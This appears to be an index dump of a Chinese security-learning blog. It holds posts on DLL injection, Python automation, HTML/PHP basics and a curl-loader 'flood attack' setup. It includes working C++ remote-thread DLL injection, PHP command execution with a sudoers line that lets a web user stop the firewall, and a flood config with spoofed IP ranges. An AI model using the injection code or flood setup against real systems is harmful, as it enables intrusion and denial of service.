lpParameter,\n    IN ULONG Flags,\n    IN SIZE_T StackZeroBits,\n    IN SIZE_T SizeOfStackCommit,\n    IN SIZE_T SizeOfStackReserve,\n    OUT PVOID lpBytesBuffer);\n\n#else\ntypedef DWORD(WINAPI* pfnNtCreateThreadEx)\n(\n    PHANDLE ThreadHandle,\n    ACCESS_MASK DesiredAccess,\n    LPVOID ObjectAttributes,\n    HANDLE ProcessHandle,\n    LPTHREAD_START_ROUTINE lpStartAddress,\n    LPVOID lpParameter,\n    BOOL CreateSuspended,\n    DWORD dwStackSize,\n    DWORD dw1,\n    DWORD dw2,\n    LPVOID Unknown\n    );\n#endif\n\n// 判断是否是win7 以后的版本\nBOOL IsVistaOrLater()\n{\n    OSVERSIONINFOEX os;\n    ZeroMemory(&os, sizeof(os));\n    os.dwOSVersionInfoSize = sizeof(os);\n    // 此API已经被弃用\n    GetVersionEx((OSVERSIONINFO*)&os);\n    if (os.dwMajorVersion>= 6)\n    {\n        return TRUE;\n    }\n    else {\n        return FALSE;\n    }\n}\nBOOL MyCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuff)\n{\n    HANDLE hThread = NULL;\n    FARPROC pFunc = NULL;\n    if (IsVistaOrLater())\n    {\n        HMODULE hNtdll = GetModuleHandle(L\"ntdll.dll\");\n        if (hNtdll == NULL)\n        {\n            printf(\"GetModuleHandle ntdll.dll error\");\n            return FALSE;\n        }\n        pFunc = GetProcAddress(hNtdll, \"NtCreateThreadEx\");\n        if (pFunc == NULL)\n        {\n            printf(\"GetProcAddress NtCreateThreadEx error\");\n            return FALSE;\n        }\n        ((pfnNtCreateThreadEx)pFunc)(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)pThreadProc, pRemoteBuff, FALSE,NULL, NULL, NULL, NULL);\n        if (hThread == NULL)\n        {\n            printf(\"NtCreateThreadEx error %d\\n\", GetLastError());\n            system(\"pause\");\n            return FALSE;\n        }\n    }\n    else {\n        hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuff, 0, NULL);\n        if (hThread == NULL)\n        {\n            printf(\"CreateRemoteThread error\");\n            return FALSE;\n        }\n    }\n    if (WAIT_FAILED == WaitForSingleObject(hThread, INFINITE))\n    {\n        printf(\"WaitForSingleObject error\");\n        return FALSE;\n    }\n    return TRUE;\n}\n\n\nbool SetDebugPrivilege()\n{\n    HANDLE hToken;\n    TOKEN_PRIVILEGES tokenPrivileges;\n    LUID luid;\n\n    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))\n    {\n        std::cout << \"Failed to open process token.\" << std::endl;\n        return false;\n    }\n\n    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))\n    {\n        std::cout << \"Failed to lookup privilege value.\" << std::endl;\n        CloseHandle(hToken);\n        return false;\n    }\n\n    tokenPrivileges.PrivilegeCount = 1;\n    tokenPrivileges.Privileges[0].Luid = luid;\n    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))\n    {\n        std::cout << \"Failed to adjust token privileges.\" << std::endl;\n        CloseHandle(hToken);\n        return false;\n    }\n\n    CloseHandle(hToken);\n    return true;\n}\n\n\nBOOL InjectDll(DWORD dwPid, char* szDllName)\n{\n    HANDLE hProcess = NULL;\n    LPVOID pRemotebuff = NULL;\n    LPTHREAD_START_ROUTINE pThreadProc = NULL;\n    SIZE_T dwBuffsize = strlen(szDllName) + 1;\n\n    if (!SetDebugPrivilege())\n    {\n        printf(\"SetDebugPrivilege error %d\\n\", GetLastError());\n        return FALSE;\n    }\n    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)))\n    {\n       \n        printf(\"OpenPrcess error %d \\n\",GetLastError());\n        return FALSE;\n    }\n    pRemotebuff = VirtualAllocEx(hProcess, NULL, dwBuffsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    if (pRemotebuff == NULL)\n    {\n        printf(\"VirtualAllocEx error\");\n        return FALSE;\n    }\n    //ZeroMemory(pRemotebuff, dwBuffsize);\n    if (!WriteProcessMemory(hProcess, pRemotebuff, szDllName, dwBuffsize, NULL))\n    {\n        printf(\"WriteProcessMemory error\");\n        return FALSE;\n    }\n    HMODULE hModule = GetModuleHandle(L\"Kernel32\");\n    if (hModule == NULL)\n    {\n        printf(\"GetModuleHandle Kernel32.dll error\");\n        return FALSE;\n    }\n    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, \"LoadLibraryA\");\n    if (pThreadProc == NULL)\n    {\n        printf(\"GetProcAddress LoadLibraryA error\");\n        return FALSE;\n\n    }\n    if (!MyCreateRemoteThread(hProcess, (LPTHREAD_START_ROUTINE)pThreadProc, pRemotebuff))\n    {\n        printf(\"MyCreateRemoteThread error %d\\n\",GetLastError());\n        return FALSE;\n    }\n    VirtualFreeEx(hProcess, pRemotebuff, 0, MEM_RELEASE);\n    CloseHandle(hProcess);\n    return TRUE;\n}\n\n```\n\n4、易错点\n\n- DLL全路径\n- NtCreateThreadEx 原型的定义\n- 给进程SeDebug权限，","tags":["编程"],"categories":["编程"]},{"title":"Python补充学习","url":"/2023/10/17/编程/python学习/","content":"\n## python 补充学习\n\n1、函数参数（可变长参数）\n\n```\n# 可变长参数 *args 代表可选参数，**kwargs 代表可选字典参数\ndef test_args(a,b,*args,**kwargs):\n    print(a+b)\n    print(args)\n    print(kwargs)\n    return args,kwargs\n\n\n# Press the green button in the gutter to run the script.\nif __name__ == '__main__':\n    print_hi('PyCharm')\n    test_args(10,20,'xxx','xx1',name='xx11')\n\n```\n\n2、自动化操作\n\n-  selenium  操作浏览器\n\n```python\n # 1 安装chromedriver.exe  参考 https://blog.csdn.net/qq_35462334/article/details/133806824\n # 2 安装selenium  pip install selenium\n \nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\n\ndriver = webdriver.Chrome()\ndriver.get(\"http://www.woniunote.com/\")\n# 可利用以下多个方法来定位元素\n# By.ID  By.XPATH By.LINK_TEXT BY.PARTIAL_LINK_TEXT By.NAME BY.TAG_NAME BY.CLASS_NAME BY.CSS_SELECTOR\na_tag_list = driver.find_elements(By.XPATH, '//*[@id=\"loginmenu\"]')\ndriver.close()\n\n```\n\n-  windows元素自动化   uiautomation 操作计算器\n\n  ```python\n  # UIAutomation 识别windows元素 自动操控\n  # 1、利用uispy 查看元素\n  # 2、定位元素\n  import uiautomation\n  \n  calc = uiautomation.WindowControl(Name='计算器')\n  calc.ButtonControl(AutomationId='num1Button').Click()\n  calc.ButtonControl(AutomationId='plusButton').Click()\n  calc.ButtonControl(Name='三').Click()\n  calc.ButtonControl(AutomationId='equalButton').Click()\n  \n  ```\n\n  ![image-20231022113623154](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231022113623154.png)\n\n","tags":["编程"],"categories":["编程"]},{"title":"Web 基础知识","url":"/2023/07/31/Web渗透/Web基础知识/","content":"\n### 一、HTML语言\n\n1、HTML 超文本标记语言，由一系列事先约定好的标记、属性和内容组成。\n\n- 文本：设置字体、大小、颜色\n- 图片：设置边框、大小、位置\n- 超链接：图片文本都可以添加超链接\n- 表格：行列的结构化数据，设置大小、背景\n- 表单：文本框、下拉框、单选框、复选框、按钮、文本域等\n- 多媒体：视频、音频\n\n2、CSS：  Cascade Style Sheet  层叠样式表，用于对页面元素进行布局和美化\n\n3、JavaScript： 浏览器中运行的解释型编程语言，用于进行页面的交互。\n\n### 二、HTML基本元素的使用\n\n#### 1、各个元素的简单使用\n\n```\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>This is a demo Html</title>\n</head>\n<body> \n   <!-- 文本 -->\n   <div style=\"font-family: 宋体 ;font-size:20px\">12314</div>\n   <!-- 图片 -->\n   <img src=\"img/20230213-1.png\" width=\"500px\"><br/>\n   <!-- 超链接 使用target=\"_blank\" 打开新的标签页 -->\n   <a href=\"http://www.baidu.com\" target=\"_blank\">百度</a>\n    <!-- 表格 -->\n    <table width=\"500\" height=\"100\" border=\"1\">\n        <tr>\n            <td></td>\n            <td></td>\n        <tr>\n            <td></td>\n            <td></td>\n        </tr>\n    </table>\n    <!-- 文本框 -->\n    <input type=\"text\"  placeholder=\"请输入用户名\">\n    <!-- 密码 -->\n    <input type=\"password\">\n    <!-- 按钮 -->\n    <input type=\"button\" value=\"登录\">\n    <!-- 下拉框 -->\n    <select>\n        <option>选项1</option>\n        <option selected>选项2</option>\n    </select>\n    <!-- 按钮 -->\n    <button>点我</button>\n\n</body>\n</html>\n```\n\n\n\n####  2、CSS选择器\n\n- 标签选择器\n\n  ```\n   td{\n       background-color: grey;/* 设置背景色*/\n        margin: auto;            /* 设置容器水平居中*/\n     }\n  ```\n\n  \n\n- 类选择器\n\n  ```\n       .button{\n              background-color: grey;/* 设置背景色*/\n              margin: auto;            /* 设置容器水平居中*/\n          }\n  ```\n\n  \n\n- ID选择器\n\n  ```\n    #button{\n              background-color: grey;/* 设置背景色*/\n              margin: auto;            /* 设置容器水平居中*/\n          }\n  ```\n\n  \n\n- 属性选择器\n\n          div [type=\"button\"]{\n              background-color: #7fffd4;\n              width: 25%;\n              text-align: center;\n              font-size: 30px;\n          }\n\n- 组合选择器\n\n  ```\n  #button td{\n              background-color: #7fffd4;\n              width: 25%;\n              text-align: center;\n              font-size: 30px;\n             }\n  ```\n\n  \n\n- 伪类选择器\n\n     ```\n     // 设置悬停效果\n     .button div:hover{\n     \tbackground-color: #7fffd4;\n     }\n     ```\n\n### 三、JavaScript\n\n#### 1、DOM操作\n\n直接操作页面元素的方法的集合，是一套JS代码接口。此外还有BOM，通过JS操作浏览，比如前进，后退、导航、刷新等。\n\n- 执行顺序问题\n\n  放在前面，可能会因为页面还未加载出现找不到元素的问题，可通过放在后面解决。\n\n  此外也可以写成一个函数，通过onload和onclick来触发函数\n\n  ```\n      <script>\n          function calTitle(){\n            // 加Var 代表局部变量，不加是全局，建议加var 定义变量\n              var calTitle1 = document.getElementsByClassName(\"title\")[0].innerHTML;\n              window.alert(calTitle1);\n          }\n          //var calTitle = document.getElementsByClassName(\"title\").innerHTML;\n          //window.alert(calTitle);\n      </script>\n  \n  </head>\n  <body onload=\"calTitle()\"></body>\n  // <div class=\"title\" onclick=\"calTitle()\"> 蜗牛计算器</div>\n  ```\n  \n- JS定位元素\n\n  ```\n  1、document.getElement\n  document.getElementById        \n  document.getElementsByClassName\n  document.getElementsByName\n  document.getElementsByTagName\n  document.getElementsByTagNameNS\n  2、xpath\n  // 获取所有标签为a的元素并且id 为 'web-nav-app-download-btn'\n  var a=document.evaluate(\"//a[@id='web-nav-app-download-btn']\", document).iterateNext()\n  ```\n  \n\n#### 2 、JS 实现基本的计算逻辑\n\n```\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>基于Table实现计算器</title>\n\n    <style>\n        /* 类选择器*/\n        .button{\n            background-color: grey;/* 设置背景色*/\n            margin: auto;            /* 设置容器水平居中*/\n        }\n        /* 层次选择器，选择button 下面的所有标签为td的元素*/\n        .button td{\n            background-color: #7fffd4;\n            width: 25%;\n            text-align: center;\n            font-size: 30px;\n        }\n        .point-red{\n            width: 20px;\n            height: 20px;\n            background-color: red;\n            float: left;\n            margin-left: 10px;\n            border-radius: 50%;\n        }\n        .point-blue{\n            width: 20px;\n            height: 20px;\n            background-color: blue;\n            float: left;\n            margin-left: 10px;\n            border-radius: 50%;\n        }\n        .point-green{\n            width: 20px;\n            height: 20px;\n            background-color: green;\n            float: left;\n            margin-left: 10px;\n            border-radius: 50%;\n        }\n        .title{\n            color: white;\n            font-size: 22px;\n            float: right;\n            margin-right: 20px;\n        }\n\n    </style>\n\n    <script>\n\n        function isLastCharacterNumber(str) {\n            // 使用正则表达式匹配最末尾是否为数字\n            return /\\d$/.test(str);\n            }\n        // 输入数字\n        function clickNumber(number)\n        {\n            var result = document.getElementById(\"result\");\n            result.innerHTML += number;\n        }\n        // 输入运算符\n        function clickOperator(operator)\n        {\n            var result = document.getElementById(\"result\");\n            result_text = result.innerHTML;\n            \n            if (isLastCharacterNumber(result_text))\n            {\n                result.innerHTML +=operator;\n            }\n            else{\n                window.alert(\"输入不合法!\");\n            }\n\n        }\n\n        // 输入小数点\n        function clickPointer(operator)\n        {\n            var result = document.getElementById(\"result\");\n            result_text = result.innerHTML;\n            \n            if (isLastCharacterNumber(result_text))\n            {\n                var match = result_text.match(/[\\d.]+$/);\n                var HasPoint = /\\./.test(match);\n                if (HasPoint)\n                {\n                    window.alert(\"输入不合法\");\n                }\n                else{\n                    result.innerHTML +=operator;\n                }\n\n            }\n            else{\n                window.alert(\"输入不合法!\");\n            }\n\n        }\n\n        // 计算结果  eval  把字符串当代码执行\n        function doCalc()\n        {\n            var result = document.getElementById(\"result\");\n            var expression = result.innerHTML;\n            result.innerHTML = eval(expression);\n        }\n        // 清空结果\n        function doClear(){\n            var result = document.getElementById(\"result\");\n            result.innerHTML = \"\";\n        }\n        // 删除（退格）\n        function doBack()\n        {\n            var result = document.getElementById(\"result\");\n            result_text = result.innerHTML;\n            var len = result_text.length;\n            result.innerHTML = result_text.substring(0,len-1);\n\n        }\n    </script>\n\n</head>\n<body>\n    <!-- 两行一列 完成顶部和结果栏 -->\n    <table width=\"450\" height=\"120\" cellspacing=\"5\" border=\"0\" bgcolor=\"grey\"  align=\"center\">\n        <tr>\n            <td bgcolor=\"grey\" height=\"50\" >\n                <div class=\"point-red\"></div>\n                <div class=\"point-blue\"></div>\n                <div class=\"point-green\"></div>\n                <div class=\"title\" onclick=\"calTitle()\"> 蜗牛计算器</div>\n\n            </td>  \n        </tr>\n        <tr>\n            <td bgcolor=\"white\" style=\"border:solid 2px red;\" id=\"result\"></td>\n        </tr>\n        \n    </table>\n    <!-- 五行四列计算器 -->\n    <table width=\"450\" height=\"400\" border=\"0\" align=\"center\" cellspacing=\"4\" class=\"button\" >\n        <tr>\n            <td onclick=\"doClear()\">AC</td>\n            <td>+/-</td>\n            <td onclick=\"clickOperator('%')\">%</td>\n            <td onclick=\"clickOperator('/')\">÷</td>\n        </tr>\n    \n        <tr>\n            <td onclick=\"clickNumber(7)\">7</td>\n            <td onclick=\"clickNumber(8)\">8</td>\n            <td onclick=\"clickNumber(9)\">9</td>\n            <td onclick=\"clickOperator('*')\">*</td>\n        </tr>\n        <tr>\n            <td onclick=\"clickNumber(4)\">4</td>\n            <td onclick=\"clickNumber(5)\">5</td>\n            <td onclick=\"clickNumber(6)\">6</td>\n            <td onclick=\"clickOperator('-')\">-</td>\n        </tr>\n        <tr>\n            <td onclick=\"clickNumber(1)\">1</td>\n            <td onclick=\"clickNumber(2)\">2</td>\n            <td onclick=\"clickNumber(3)\">3</td>\n            <td onclick=\"clickOperator('+')\">+</td>\n        </tr>\n        <tr>\n            <td onclick=\"clickNumber(0)\">0</td>\n            <td onclick=\"doBack()\">删除</td>\n            <td onclick=\"clickPointer('.')\">.</td>\n            <td onclick=\"doCalc()\">=</td>\n        </tr>\n    </table>\n</body>\n</html>\n```\n\n### 四、PHP语法\n\n#### 1、基本概念\n\nphp 运行于web服务器中，主要用于网页的处理。\n\n#### 2、变量命名规范\n\n- 变量以 $ 符号开始，后面跟着变量的名称\n- 变量名必须以字母或者下划线字符开始\n- 变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）\n- 变量名不能包含空格\n- 变量名是区分大小写的（$y 和 $Y 是两个不同的变量）\n\n#### 3、正则\n\n- 字符串匹配\n\n  ```\n  echo preg_match($pattern,$str)\n  ```\n\n  \n\n- 字符串查找\n\n  ```\n  preg_match_all($pattern,$str,$result);\n  ```\n\n  \n\n- 字符串替换\n\n  ```\n  $temp = preg_replace($pattern1,$replace_str,$str);\n  ```\n\n  \n\n#### 4、数组\n\n```\n<?php\n$arr = array(\"123\",\"123123\");\n$len = count($arr);\necho $len. \"<br>\";\necho $arr[0].\"<br>\";\n\n?>\n```\n\n#### 5、前后端交互\n\n三种请求方式\n\n- 资源请求型：GET+URL\n- 数据提交型：POST+URL+请求正文\n- AJAX提交：异步提交，在不刷新当前页面的前提下，提交数据到后台\n\nPOST请求\n\n- 必须被<form></form>包裹  \n- 必须指定action，即提交的对象\n- 必须指定提交方式 method=\"GET/POST\"\n- 必须确保在form标签中，有至少一个提交按钮\n\n```html\n    <form action=\"login.php\" method=\"POST\">\n        <label for=\"username\">用户名:</label>\n        <input type=\"text\" id=\"username\" name=\"username\" required><br><br>\n        \n        <label for=\"password\">密码:</label>\n        <input type=\"password\" id=\"password\" name=\"password\" required><br><br>\n        \n\n        <label for=\"captcha\">验证码:</label>\n        <input type=\"text\" id=\"captcha\" name=\"captcha\" required><br><br>\n\n\n        <input type=\"submit\" value=\"登录\">\n    </form>\n```\n\nAJAX请求\n\n![image-20230829220609192](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230829220609192.png)\n\n引入Jquery 库\n\n```\n    <script type=\"text/javascript\" src=\"./jquery-3.4.1.min.js\"></script>\n\n    <script>\n        function dopost()\n        {\n            //获取表单元素的值\n            var username = $(\"#username\").val();\n            var password = $(\"#password\").val();\n            var captcha = $(\"#captcha\").val();\n            //通过字符串拼接为请求正文\n            var parm = \"username=\" + username + \"&password=\"+ password+ \"&captcha=\"+captcha;\n            // window.alert(parm);\n            //利用AJAX发送POST请求\n            $.post(\"login.php\",parm,function(data){\n                window.alert(data);\n            });\n        }\n    </script>\n```\n\n#### 6、 Session和Cookie\n\n   HTTP 默认是无状态的，服务器不知道客户端是谁，使用Session来将客户端的状态保存在服务器。\n\n![image-20230904222926378](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230904222926378.png)\n\n服务端启用Session\n\n```\n// 记录登录的状态\nsession_start();\n$_SESSION['login'] = 'True';\n\n\n// 判断\nsession_start()\nif($_SESSION['login'])!='True')\n{\t\n\twindow.alert(\"请先登录\");\n}\n```\n\nsession的机制决定了存在安全漏洞，无法避免。\n\n#### 7、php 执行指令\n\n```\n<?php\n\n// 使用php 执行命令\n// 1 使用反引号\n\n// $result = `ipconfig`;\n// $result = iconv(\"GBK\",\"UTF-8\",$result);\n// echo $result;\n\n//2 system 函数\n\n$result = system(\"whoami\");\necho $result;\n\n//3 exec 函数\necho exec(\"whoami\");\n\n\n// 很多命令 php 的默认用户www 没有权限执行，实在需要执行，添加权限到/etc/sudoers 文件中去\n// 如下所示为授权cleint 用户在任何地点以root 用户身份执行 /usr/bin/systemctl stop firewalld\n//cleint ALL=(root) /usr/bin/systemctl stop firewalld\n\n?>\n```\n\n8、读写文件\n\nfile_get_contents函数、file_put_contents函数，fopen函数、fwirte函数、fclose函数等\n\n```\n<?php\n\n// 取消超时30s限制\nset_time_limit(0);\n\n\n// 实时输出某个文件的内容\n$pos = 0;\nwhile(true)\n{\n    $fp = fopen(\"test.txt\",'r');\n    fseek($fp,$pos);\n    while($line=fgets($fp))\n    {\n        $line = iconv(\"GBK\",\"UTF-8\",$line);\n        echo $line . \"<br>\";\n    }\n    $pos = ftell($fp);\n    fclose($fp);\n    ob_flush();\n    flush();\n    sleep(2);\n    \n}\n?>\n```\n\n9、php 操作json\n\n```php+HTML\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <script>\n        function json()\n        {\n            var users = [\"张三\",\"李四\"];\n            for(var i=0;i<users.length;i++)\n            {\n                document.write(users[i]+\"<br>\");\n            }\n            var user1 = {\"name\":\"张三\",\"sex\":\"男\"};\n            var user2 = {\"name\":\"李四\",\"sex\":\"女\"};\n            var user11 = {user1:[\"张三\",\"男\"],user2:[\"李四\",\"女\"]}\n            var user = [user1,user2];\n\n        //     document.write(user1.name +\"<br>\");\n        //     document.write(user1.sex+\"<br>\");\n\n        //     document.write(user[0].name+\"<br>\");\n\n        //     document.write(user11.user1[0]+\"<br>\");\n        // \n    }\n    </script>\n\n</head>\n<body onload=\"json()\">\n\n    <?php\n        //引用其他php\n        // require_once(\"comm.php\");\n        include_once(\"comm.php\");\n\n        $user1 = array(\"name\"=>\"张三\",\"sex\"=>\"男\");\n        $user2 = array(\"name\"=>\"李四\",\"sex\"=>\"女\");\n\n        $user = array($user1,$user2);\n        print_r($user);\n        echo json_encode($user);  //JSON 序列化  将变量或者对象转换成字符串 相反也有JSON反序列化,把字符串转成变量或者对象\n\n        $string = '[{\"name\":\"\\u5f20\\u4e09\",\"sex\":\"\\u7537\"},{\"name\":\"\\u674e\\u56db\",\"sex\":\"\\u5973\"}]';\n        $array = json_decode($string);\n        print_r($array);\n    ?>\n    \n</body>\n</html>\n```\n\n10. php 操作xml\n\n    ```php\n    $doc  = new DOMDocument();\n    $doc->preserveWhiteSpace = false;\n    $doc->load('.\\\\student.xml');\n    \n    // 读取class节点的属性\n    $nodes = $doc->getElementsByTagName('class');\n    $attr = $nodes->item(0)->attributes->item(0)->nodeName;\n    $attr_value = $nodes->item(0)->attributes->item(0)->nodeValue;\n    echo $attr;\n    \n    // 读取student节点的属性\n    \n    $nodes = $doc->getElementsByTagName('student');\n    $childnodes = $nodes->item(1)->childNodes;\n    foreach($childnodes as $node)\n    {\n        echo $node->nodeValue . \"<br>\";\n    }\n    \n    // 读取所有学生的名字\n    \n    $nodes = $doc->getElementsByTagName(\"name\");\n    foreach($nodes as $node){\n        echo $node->nodeValue . \"<br>\";\n    }\n    ```\n    \n\n11、PHP 面向对象\n\n- ​      封装\n\n```php\n<?php\nclass People\n{\n    // 封装  public private protected\n    // 1. 默认情况下，所有属性和方法，都是public\n    // 2  private 表示类私有，在类的定义这种可以使用，而在实例和子类中无法使用\n    // 3  protected 表示受类的保护，实例中不能直接使用。子类中可以使用\n\n    private $name = \"\";\n    var $age = 0;\n    var $addr = \"\";\n    var $nation = \"\";\n\n    //定义方法\n    function talk()\n    {\n        echo \"$this->name\" . \"人正在说话 <br>\";\n    }\n    // 针对私有属性，在公有方法中进行修改\n    function setName($name)\n    {\n        $this->name = $name;\n        echo \"$this->name\";\n    }\n\n}\n\n$p1 = new People();\n$p1->age = 30;\n$p1->addr = \"成都\";\n$p1->nation = \"汉族\";\n$p1->setName(\"张三\");\n?>\n```\n\n- 继承\n\n```php\n// 继承  Man是People的子类\nclass Man extends People\n{\n    // Man可以使用People 的非私有属性和方法\n    var $name  = '';  \n\n    function work()\n    {\n        $this->eat();  //子类中可以使用父类的受保护的方法\n        // parent::eat();\n        echo \"$this->name\" . \"正在工作 <br>\";\n    }\n\n}\n$m = new Man();\necho $m->age;\n$m->name = \"子类\";  \n$m->work();\n?>\n```\n\n- 多态\n\n针对弱类型编程语言，多态不是特别的准确，在强类型编程语言中，较为重要。\n\n- 抽象类： 类的方法中有一个方法使用abstract 关键字定义，则该类就是抽象类，该方法就是抽象方法\n\n​       抽象类的特点，不能被实例化，只能被继承，抽象方法不能有实现代码。\n\n```php\nabstract class animal{  //抽象类\n\tabstract functin can();  //抽象方法\n}\nclass cat extends animal\n{\n\tfunction can()\n\t{\n\t\techo \" I can climb <br>\";\n\t}\n}\nfunction test($obj)\n{\t\n\t$obj>can();\n}\ntest(new cat());\n```\n\n- final 关键词   \n\n​     如果一个类被final 修饰，则该类不能被继承。\n\n- php 面向对象示例\n\n  ```php\n  class DB\n  {\n  \n      var $host = '';\n      var $username = '';\n      var $password = '';\n      var $database = '';\n  \n      var $conn = null;\n  \n      // 构造方法\n      function __construct($host='127.0.0.1',$username='root',$password = '123456',$database='learn')\n      {\n          $this->host = $host;\n          $this->username = $username;\n          $this->password = $password;\n          $this->database = $database;\n          $this->Create_Connection();\n      }\n  \n      // 创建连接\n      private function Create_Connection()\n      {\n          $this->conn = mysqli_connect($this->host,$this->username,$this->password,$this->database);\n  \n      }\n      // 查询\n  \n      function mysql_query($sql)\n      {\n          $result = mysqli_query($this->conn,$sql);\n          $rows = mysqli_fetch_all($result,MYSQLI_ASSOC);\n          return $rows;\n      }\n      \n      // 更新\n      function mysql_modify($sql)\n      {\n          $result = mysqli_query($this->conn,$sql);\n          if(!$result)\n          {\n              die(\"数据库更新失败\");\n          }\n      }\n      \n  \n      // 关闭连接\n      private function Close_connection()\n      {\n          if($this->conn!=null)\n          {\n              mysqli_close($this->conn);\n          }\n      }\n  \n      // 析构方法\n      function __destruct()\n      {\n          $this->Close_connection();\n      }\n  }\n  ```\n\n  - 序列化与反序列化\n  \n    ```php\n    \n    //1、字符串的序列化\n    \n    $name = \"张三\";\n    echo serialize($name);\n    \n    //s:6:\"张三\";\n    \n    \n    //2、数组的序列胡\n    \n    \n    $studen = array(\"name\"=>\"张三\",\"age\"=>30);\n    echo serialize($studen);\n    \n    // a:2:{s:4:\"name\";s:6:\"张三\";s:3:\"age\";i:30;}\n    \n    // 符合序列化规则的字符串，无论是否由serialize 函数生成，都可以被反序列化\n    \n    $stu = unserialize('a:2:{s:4:\"name\";s:6:\"张三\";s:3:\"age\";i:30;}');\n    print_r($stu);\n    \n    //3、类的序列化  \n    \n    // (1)、魔术方法 _Sleep()\n    \n      /* 魔术方法  当类进行序列化时自动调用，并且返回一个数据，包含要序列化的类属性\n      function __sleep()\n      {\n          echo \"DB 正在进行序列化<br>\";\n          return array(\"host\",\"username\",\"password\",\"database\");\n      }*/\n    \n    \n    $db = new DB();\n    \n    echo serialize($db);\n    \n    //DB 正在进行序列化  \n    // O:2:\"DB\":4:{s:4:\"host\";s:9:\"127.0.0.1\";s:8:\"username\";s:4:\"root\";s:8:\"password\";s:6:\"123456\";s:8:\"database\";s:5:\"learn\";}\n    \n    $xx = unserialize('O:2:\"DB\":4:{s:4:\"host\";s:9:\"127.0.0.1\";s:8:\"username\";s:4:\"root\";s:8:\"password\";s:6:\"123456\";s:8:\"database\";s:5:\"learn\";}');\n    echo $xx->host;\n    \n    echo $xx->mysql_query($sql);  //这时候会失败， 因为没地方建立连接，此时需要借用魔术方法__wakeup()\n    \n    // (2)、__wakeup() 在类被反序列化时调用，并且可以在方法恢复类状态的代码，以便于让反序列化的实例可以正常调用方法\n    /*\n    \n        //魔术方法 当类进行反序列化时调用\n    \n        function __wakeup()\n        {\n            echo \"DB 正在被反序列化<br>\";\n            $this->Create_Connection();\n        }\n    */\n    ```\n  \n    字符串变对象的过程中，如果没有对字符串进行输入检查，很有可能注入恶意代码，即反序列化漏洞。通常反序列化漏洞并非通过黑盒和盲注的方法进行探测，而通过代码评审进行漏洞验证。\n  \n    \n  \n    \n\n","tags":["web渗透"],"categories":["web渗透"]},{"title":"Curl_loader 泛洪攻击","url":"/2023/07/20/黑客工具/curl_loader泛洪攻击/","content":"\n1、安装过程\n\n下载链接 ：https://master.dl.sourceforge.net/project/curl-loader/curl-loader/curl-loader-0.56/curl-loader-0.56.tar.bz2?viasf=1\n\n安装依赖\n\n```\nyum install openssl -y\nyum install openssl-devel -y\n```\n\n解压并make\n\n```\ntar -xjf curl-loader-0.56.tar.bz2\ncd curl-loader-0.56\nmake\n```\n\n2、使用步骤\n\n配置文件  示例  参考链接：https://curl-loader.sourceforge.net/doc/faq.html\n\n```\n10k.conf\n########### GENERAL SECTION ################################\nBATCH_NAME= 10K        # 名称\nCLIENTS_NUM_MAX=10000  # 最大一万个客户端\nCLIENTS_NUM_START=100  # 从100个客户端开始\nCLIENTS_RAMPUP_INC=50  # 每次增加50\nINTERFACE   =eth0   # 网卡\nNETMASK=16         # 掩码\nIP_ADDR_MIN= 192.168.1.1    # 伪装的IP起始\nIP_ADDR_MAX= 192.168.53.255  #Actually - this is for self-control\nCYCLES_NUM= -1   # 循环次数 -1代表无限循环\nURLS_NUM= 1      # URL的数量\n\n########### URL SECTION ####################################\n\nURL=http://localhost/index.html\n#URL=http://localhost/ACE-INSTALL.html\nURL_SHORT_NAME=\"local-index\"\nREQUEST_TYPE=GET\nTIMER_URL_COMPLETION = 5000      # In msec. When positive, Now it is enforced by cancelling url fetch on timeout\nTIMER_AFTER_URL_SLEEP =20   # 请求发的间歇\n```\n\n使用命令\n\n```\n./curl-loader -f test.conf\n```\n\n![image-20230722085029392](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230722085029392.png)\n\n![image-20230722085048540](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230722085048540.png)\n","tags":["黑客工具"],"categories":["黑客工具"]},{"title":"LNMP环境（支持LUA）","url":"/2023/07/11/Web渗透/LNMP环境安装/","content":"\n#### 1、安装Mysql5.7\n\n-  配置Mysql 的yum 源 CentOS 的yum源中没有mysql，需要到mysql的官网下载yum repo配置文件\n\n```\n# 下载安装\nwget http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm\nrpm -ivh mysql57-community-release-el7-11.noarch.rpm \nrpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022\nyum -y install mysql-server\n\n# 查看mysqld 服务是否存在并启动\nsystemctl start mysql\nsystemctl status mysqld\n\n# 获取临时密码（mysql5.7才有，5.6默认密码为空）\ncat /var/log/mysqld.log |grep password\n2023-07-06T14:49:50.366809Z 1 [Note] A temporary password is generated for root@localhost: 